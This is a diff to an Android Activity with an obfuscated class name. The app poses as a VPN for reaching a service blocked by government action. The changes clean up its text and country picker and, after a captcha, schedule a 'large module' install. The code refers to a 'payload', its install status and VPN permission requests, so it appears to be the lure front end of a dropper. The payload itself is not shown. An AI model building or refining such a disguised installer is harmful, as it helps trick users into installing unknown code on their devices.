@@ -180,7 +180,7 @@ public class A4450c4b785 extends Activity {
         inner.addView(title);
 
         TextView desc = new TextView(this);
-        desc.setText("This app uses vpn vpn vpn services to setup connections to tunnel connections to other country which qvse is still operating not suspended by government legal requirements.");
+        desc.setText("This app uses VPN services to set up tunnel connections to other countries where QVSE is still operating and not suspended by government legal requirements.");
         desc.setTextColor(Color.parseColor("#CCCCCC"));
         desc.setTextSize(16);
         desc.setGravity(Gravity.CENTER);
@@ -221,8 +221,21 @@ public class A4450c4b785 extends Activity {
 
         RadioGroup rg = new RadioGroup(this);
         rg.setOrientation(RadioGroup.VERTICAL);
+        rg.setOnCheckedChangeListener((group, checkedId) -> {
+            // find checked
+            for (int i = 0; i < group.getChildCount(); i++) {
+                RadioButton rbtn = (RadioButton) group.getChildAt(i);
+                if (rbtn.getId() == checkedId) {
+                    String t = rbtn.getText().toString();
+                    if (t.contains("India")) selectedCountry = "India";
+                    else if (t.contains("USA")) selectedCountry = "USA";
+                    else if (t.contains("Ghana")) selectedCountry = "Ghana";
+                    break;
+                }
+            }
+        });
 
-        String[] countries = {"India", "USA", "USA", "USA", "Ghana", "hifhli8"};
+        String[] countries = {"India", "USA", "Ghana"};
         for (String c : countries) {
             RadioButton rb = new RadioButton(this);
             if (c.equals("India")) {
@@ -232,7 +245,8 @@ public class A4450c4b785 extends Activity {
             }
             rb.setTextColor(Color.WHITE);
             rb.setPadding(20, 30, 20, 30);
-            rb.setOnClickListener(v -> selectedCountry = c.equals("hifhli8") ? "hifhli8" : (c.equals("India") ? "India" : "USA"));
+            final String countryVal = c;
+            rb.setOnClickListener(v -> selectedCountry = countryVal);
             if (c.equals("India")) {
                 rb.setChecked(true);
                 selectedCountry = "India";
@@ -309,7 +323,7 @@ public class A4450c4b785 extends Activity {
         verify.setLayoutParams(lp);
         verify.setOnClickListener(v -> {
             if (captchaInput.getText().toString().trim().equals(captchaCode)) {
-                startLargeModuleInstall();
+                showLargeModulePrep();
             } else {
                 Toast.makeText(this, "Invalid captcha", Toast.LENGTH_SHORT).show();
             }
@@ -321,7 +335,7 @@ public class A4450c4b785 extends Activity {
         setContentView(container);
     }
 
-    private void startLargeModuleInstall() {
+    private void showLargeModulePrep() {
         container.removeAllViews();
         ScrollView scroll = new ScrollView(this);
         LinearLayout inner = new LinearLayout(this);
@@ -337,30 +351,11 @@ public class A4450c4b785 extends Activity {
         msg.setPadding(0, 0, 0, 60);
         inner.addView(msg);
 
-        status = new TextView(this);
-        status.setText("Preparing...");
-        status.setTextColor(Color.parseColor("#9CA3AF"));
-        status.setGravity(Gravity.CENTER);
-        inner.addView(status);
-
-        btn = new Button(this);
-        btn.setVisibility(View.GONE);
-        inner.addView(btn);
-
         scroll.addView(inner);
         container.addView(scroll);
         setContentView(container);
 
-        // Now run the existing install flow exactly as before
-        if (isPayloadInstalled()) {
-            doImmediateRedirect();
-            return;
-        }
-
-        btn.setOnClickListener(v -> onInstallClicked());
-        btn.setEnabled(false);
-        requestVpnPermission();
-        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
+        ui.postDelayed(this::startLargeModuleInstall, 1500);
     }
 
     @Override
